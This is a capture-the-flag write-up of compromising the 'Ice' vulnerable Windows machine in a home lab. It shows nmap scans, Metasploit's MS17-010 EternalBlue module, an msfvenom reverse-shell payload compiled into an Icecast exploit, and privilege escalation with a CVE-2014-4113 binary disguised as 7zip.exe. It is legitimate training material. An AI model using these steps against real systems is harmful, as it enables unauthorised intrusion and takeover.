# :game_die: Ice Cast Machine Writeup

> **Original Source:** [Ice Cast Machine Writeup](https://infosecwriteups.com/ice-cast-machine-writeup-by-xploit-ayush-ab658ce174bf)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Ice Cast Machine Writeup | By Xploit Ayush


This article’s goal is to list the methods I followed to finish the Ice a Vulnerable Machine. which Darkstar produced. Blue’s sequel, Ice. Anyone can deploy and abuse Ice because it is a free room.


*Photo by [Johny vino](https://unsplash.com/@johnyvino?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com/?utm_source=medium&utm_medium=referral)*Ice Vulnerable Machine Link: [https://drive.google.com/u/0/uc?id=19DnNlNWzNVSwiBYz5mxPWRPCWQmINzmz&export=download](https://drive.google.com/u/0/uc?id=19DnNlNWzNVSwiBYz5mxPWRPCWQmINzmz&export=download)


Difficulty : Intermediate

*Windows*

## LETS EXPLOIT:


First, we need to download the Ice machine. Once it’s downloaded, we’ll open it in VirtualBox and start the Ice cast machine as the victim machine. Next, we’ll start our Parrot machine as the attacker machine in order to get the IP address of the victim machine.


Using Netdiscover or Nmap


```
nmap 192.168.29.0/24
or
sudo netdiscover -r 192.168.29.0/24
```


*Ice machine IP*


```
nmap -sV --script vuln <IP>
```


*Nmap scan*


*Nmap — script vuln scan*


When we perform a scan, we can see that there is a critical vulnerability in SMBv1 that allows for remote code execution. This vulnerability has a CVE assigned to it, which is MS17–010.


We can use Metasploit to scan and exploit this vulnerability.


```
msfconsole
search ms17-010
use exploit (windows/smb/ms17_010_eternalblue
show options
set RHOST <IP>
run
```


*metasploit*


We have successfully obtained the shell of the Ice machine:


```
help
```


*help*


```
sysinfo
```


*sysinfo*


The name of this PC is DARK-PC


## METHOD 2


We also perform payload using Searchsploit


```
Searchsploit ice
Searchsploit -m CVE-2004-1561
```


*We will use this payload*


First, we need to download the payload to our system. We have the option to edit the payload, so we need to edit the exploit and insert our own shell code. We can create a payload using msfvenom with the following command and copy and paste the shell code into the exploit. After this, we can start the listener to begin the attack

*exploit*


```
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
```


*shell code*


The payload is written in the C language, so we need to save the shell code and compile the payload using the following command. Once the payload is compiled, we can start the listener to initiate the attack.


```
gcc 568-edit.c -o 568
```


*Shell*


We have successfully got the shell !


*whoami*


type “systeminfo” in the Ice machine command line and copy all the system details to a text file


## Get Xploit Ayush ☠️’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


So what next?we don't have Administrative privilege so we have to perform a windows privilege escalation


We need a “Windows exploit suggester” available on GitHub


*Suggester*


The Windows Exploit Suggester is a tool developed in Python that helps to identify missing patches and suggests relevant exploits for Windows platforms. This tool can be extremely useful for penetration testers, administrators, and end users who need to identify and address potential vulnerabilities on their systems. By using this tool, it becomes easier to identify missing patches and potential exploits, which can help improve the overall security of the system.


*MS014–058 Github*


Windows Exploit Suggester tool to identify any missing patches and potential exploits. There are many exploits available, but for this scenario, we will use the MS14–058 exploit, which allows for remote code execution. We will perform this exploit manually using the CLI, rather than using Metasploit.


*CVE-2014–4113-Exploit.rar*


We need to download a RAR file and extract it on our system (we can use “sudo apt-get install unrar” to install the necessary software). Once we extract the RAR file, we will have win32.exe and win64.exe. Since the Ice system is running on 64-bit, we will use win64.exe. To move this file to the Ice machine, we can use the LOLBin “certutil.exe


*unrar*


*lolbas*


Please copy the command below and use it to start our Python server, which will allow you to send the exe file to the victim’s machine.


```
python3 -m http.server
```


*python server*We got the shell !


Navigate to C:\Users\Dark\Desktop We’ve successfully transferred the win64.exe file, renamed as 7zip.exe, to the victim’s machine. To execute the file, please use the following command after ensuring the appropriate permissions:


```
dir
7zip.exe whoami
```


We have successfully compromised the machine and gained administrator privileges!!!

*Game Over*Now we have all our ingredients let’s submit it and we have successfully completed our CTF !!


Keep Trying, Keep Working :)


Thank you for Reading!!


Happy Hacking
Follow me more to get more tips and tricks! 🙏

## About the Author


*Tryhackme*

---

*Originally published on [Medium](https://infosecwriteups.com/ice-cast-machine-writeup-by-xploit-ayush-ab658ce174bf). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
